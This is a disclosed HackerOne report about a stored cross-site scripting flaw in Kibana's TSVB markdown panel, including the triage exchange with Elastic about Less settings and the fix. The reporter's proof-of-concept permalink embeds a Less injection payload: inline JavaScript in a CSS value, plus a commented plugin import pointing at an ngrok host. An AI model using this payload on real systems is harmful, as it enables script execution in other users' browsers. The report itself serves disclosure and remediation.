---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/cross-site-scripting-xss-stored
  - env/web
substate: "resolved"
weakness: "Cross-site Scripting (XSS) - Stored"
enriched: true
date: 2020-07-28
submitted: 2020-04-24T21:32:45.160Z
bounty_usd: null
votes: 5
cve: []
program: "[[programs/elastic|Elastic]]"
reporter: "jeremybuis"
source: "https://hackerone.com/reports/858874"
title: "Stored XSS in TSVB Visualizations Markdown Panel"
---
# Stored XSS in TSVB Visualizations Markdown Panel

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 5 | **Program:** Elastic | **Disclosed:** 2020-07-28

- Report: [https://hackerone.com/reports/858874](https://hackerone.com/reports/858874)
- CWE: Cross-site Scripting (XSS) - Stored
- Submitted: 2020-04-24T21:32:45.160Z

## Timeline

- **Report Filed**
- **2020-04-24** @jeremybuis: Heres a permalink to the the instance I created with my PoC visualization: [Less XSS](https://1e7e321d99544926af1c95306bed7a2d.us-east-1.aws.found.io:9243/app/kibana#/visualize/edit/1f809100-8670-11ea-9fc3-fd506a56f84c?_g=(refreshInterval:(pause:!t,value:0),time:(from:now-15m,to:now))&_a=(filters:!(),linked:!f,query:(language:kuery,query:''),uiState:(),vis:(aggs:!(),params:(axis_formatter:number,axis_position:left,axis_scale:normal,default_index_pattern:kibana_sample_data_logs,default_timefield:timestamp,id:'61ca57f0-469d-11e7-af02-69e470af7417',index_pattern:'',interval:'',isModelInvalid:!f,markdown:'%23%20XSS',markdown_css:'%23markdown-61ca57f0-469d-11e7-af02-69e470af7417%20body%7Bcolor:true%7D',markdown_less:'%2F%2F%20@plugin%20%22https:%2F%2Fe3bb0e2a.ngrok.io%2Fcxss%22;%0A%0Abody%20%7B%0A%20%20%20%20color:%20%60confirm(!'XSS!')%60;%0A%7D',series:!((axis_position:right,chart_type:line,color:%2368BC00,fill:0.5,formatter:number,id:'61ca57f1-469d-11e7-af02-69e470af7417',line_width:1,metrics:!((id:'61ca57f2-469d-11e7-af02-69e470af7417',type:count)),point_size:1,separate_axis:0,split_mode:everything,stacked:none)),show_grid:1,show_legend:1,time_field:'',type:markdown),title:LessXSS,type:metrics)))
- **Report Triaged**
- **2020-04-24** @jeremybuis: Apologies, this is my first H1 report
- **Bounty Awarded**
- **2020-04-24** @jeremybuis: Wow triaged extremely fast. Thanks for the bounty! Im happy to work with the team to validate a fix once ready.
- **2020-05-07** @douglas_day: Hey @jeremybuis ,

You mention:
>Upgrade to Less version 3.0 or greater and confirm that the Less option { javascriptEnabled: false } is properly configured. This will fix the inline JavaScript execution problem.

If we're not mistaken, setting `javascriptEnabled: false` on `2.7` fixes this (the inline vector) as well. Is there some other vector in `2.7` that would be mitigated in `3.0`?

Thanks!
Douglas
- **2020-05-08** @jeremybuis: Apologies, yes you are correct. Just confirmed that the `javaScriptEnabled: false` works as intended for version `2.7.3`. The other vector I know of is by using plugins, and that's not mitigated in 3.0. Sorry for the confusion!
- **2020-06-19** @jeremybuis: Hey @douglas_day I saw the advisory go out, and confirmed the fix. Nice work!
- **Report Resolved**
- **Agreed On Going Public**
- **2020-07-28** @jeremybuis: @douglas_day yes, Id love to privately disclose.

Is it inappropriate to write a blog post about the bug as long as this private program is not mentioned? Id only mention submitting here: https://www.elastic.co/community/security. Sorry, its not totally clear to me
- **2020-07-28** @douglas_day: Hey @jeremybuis ,

Thanks for asking! I'm actually not too sure on our policy around public vulnerability blog posts. I'll have to do some internal digging first :)
- **2020-07-28** @jeremybuis: > I'll have to do some internal digging first :)

Thanks! That would be really helpful. I found the bug while on company time, so would like to spin out a marketing piece around it :D
- **2020-07-28** @douglas_day: Cool! I'll let you know what I turn up :)
- **Manually Disclosed**
